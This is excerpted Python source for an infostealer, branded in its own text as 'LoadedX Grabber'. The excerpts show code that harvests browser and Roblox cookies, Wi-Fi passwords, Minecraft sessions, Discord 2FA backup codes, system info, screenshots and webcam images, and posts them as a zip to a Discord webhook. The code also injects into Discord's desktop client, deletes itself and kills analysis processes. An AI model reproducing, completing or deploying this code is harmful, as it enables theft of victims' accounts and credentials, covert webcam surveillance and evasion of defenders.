import base64, concurrent.futures, csv, ctypes, json, os, random, re, sqlite3, subprocess, sys, threading, time
from multiprocessing import cpu_count
from shutil import copy2
from zipfile import ZIP_DEFLATED, ZipFile
import shutil, binascii, psutil, requests
...
__CONFIG__ = {
    "webhook": "https://discord.com/api/webhooks/1454135119882489919/placeholder",
    "ping": True,
    "pingtype": "Everywhere",
    "error": False,
    "startup": False,
...
def main(webhook: str):
    ...
    if any(
        ...
        with open(_file, "rb") as file:
            encoder = MultipartEncoder(
                {
                    ...
                    "file": (
                        f"LoadedX-Logged-{os.getlogin()}.zip",
                        file,
                        "application/zip",
                    ),
                }
            ...
            requests.post(
                webhook, headers={"Content-type": encoder.content_type}, data=encoder
            )
    else:
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        computer_os = (
            subprocess.run("wmic os get Caption", capture_output=True, shell=True)
...
"""
                ...
                "embeds": [
                    {
                        ...
                        "footer": {"text": "LoadedX Grabber | Created By Smug"},
                    }
                ],
                "username": "LoadedX",
                "avatar_url": "https://static.independent.co.uk/s3fs-public/thumbnails/image/2010/05/04/11/365946.jpg",
        ...
        with open(temp_path + "\\desktopshot.png", "rb") as f:
            ...
            webcamshot = {
                "file": ("webcamshot.png", open(temp_path + "\\webcamshot.png", "rb"))
            }
...
class Browsers:
    ...
    def cookies(self, name: str, path: str, profile: str):
        ...
        if name in ("opera", "opera-gx"):
            db_path = (
                path
                if path.lower().endswith("cookies")
        ...
        with open(out_file, "a", encoding="utf-8") as f:
            ...
            for host_key, cname, cpath, encrypted_value, expires_utc in rows:
                ...
                f.write(
                    f"{host_key}\t{cname}={encrypted_hex}\tPath={cpath}\tExpires={expires_utc}\n"
                )
        cursor.close()
        conn.close()
        for suf in ("", "-wal", "-shm"):
    ...
    def roblox_cookies(self):
        ...
        if not __CONFIG__["roblox"]:
            ...
            robo_cookie = ""
            with open(
                os.path.join(temp_path, "Browser", "cookies.txt"), "r", encoding="utf-8"
            ) as g:
...
class Wifi:
    ...
    def wifi_info(self):
        ...
        with open(
            os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), "w", encoding="utf-8"
        ) as f:
...
class Minecraft:
    ...
    def session_info(self):
        with open(
            os.path.join(temp_path, "Minecraft", "Session Info.txt"),
            "w",
            encoding="cp437",
        ) as f:
    ...
    def user_cache(self):
        with open(
            os.path.join(temp_path, "Minecraft", "User Cache.txt"),
            "w",
            encoding="cp437",
        ) as f:
...
class BackupCodes:
    ...
    def get_codes(self):
        if os.path.exists(self.path + self.code_path):
            ...
            with open(
                os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"),
                "w",
                encoding="utf-8",
                errors="ignore",
            ) as f:
...
class SelfDestruct:
    ...
    def delete(self):
        if self.frozen:
            subprocess.Popen(
                'ping localhost -n 3 > NUL && del /F "{}"'.format(self.path),
                shell=True,
        ...
        for dir in self.discord_dirs:
            ...
            if self.get_core(dir) is not None:
                with open(
                    ...
                    f.write(
                        self.code.replace(
                            "discord_desktop_core-1", self.get_core(dir)[1]
...
class Debug:
    ...
    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(
                procstr in proc.name().lower() for procstr in self.blacklistedProcesses
            ):
                try:
                    proc.kill()
